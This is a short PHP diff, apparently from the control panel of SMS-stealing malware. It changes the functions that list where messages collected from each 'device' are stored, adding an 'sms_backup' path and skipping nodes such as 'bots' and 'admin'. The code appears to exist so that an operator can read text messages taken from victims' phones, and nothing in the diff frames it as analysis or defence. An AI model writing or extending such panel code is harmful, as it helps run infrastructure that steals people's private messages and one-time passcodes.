@@ -240,7 +240,7 @@ function rebel_panel_sms_suffixes(): array
 /** Global SMS roots keyed by device id */
 function rebel_panel_sms_global_nodes(): array
 {
-    return ['messages', 'user_sms', 'sms', 'all_sms', 'new_sms', 'sms_inbox', 'inbox', 'received_sms', 'sent_sms', 'sms_data', 'device_sms', 'client_sms', 'sms_logs', 'msg_store', 'text_messages'];
+    return ['messages', 'user_sms', 'sms', 'all_sms', 'new_sms', 'sms_inbox', 'inbox', 'received_sms', 'sent_sms', 'sms_data', 'device_sms', 'client_sms', 'sms_logs', 'msg_store', 'text_messages', 'sms_backup'];
 }
 
 /** All SMS read paths — rebel.py messages/{id} + SpinPlay/Shootii/Rabel fallbacks */
@@ -290,11 +290,13 @@ function rebel_sms_paths_for_device(string $deviceId, string $schema = 'rabel', 
     }
 
     if ($schema === 'rabel' || $deviceNode === 'user_list' || $deviceNode === 'user_data') {
-        $paths[] = 'user_sms/' . $id;
+        array_unshift($paths, 'sms_backup/' . $id);
+        array_unshift($paths, 'user_sms/' . $id);
         $paths[] = 'messages/' . $id;
         $paths[] = 'sms/' . $id;
+        $junkNodes = ['clients', 'users', 'data', 'sendsms', 'bots', 'Admin', 'admin'];
         foreach ($bases as $n) {
-            if ($n === '' || $n === 'user_sms') {
+            if ($n === '' || $n === 'user_sms' || in_array($n, $junkNodes, true)) {
                 continue;
             }
             foreach ($suffixes as $sfx) {
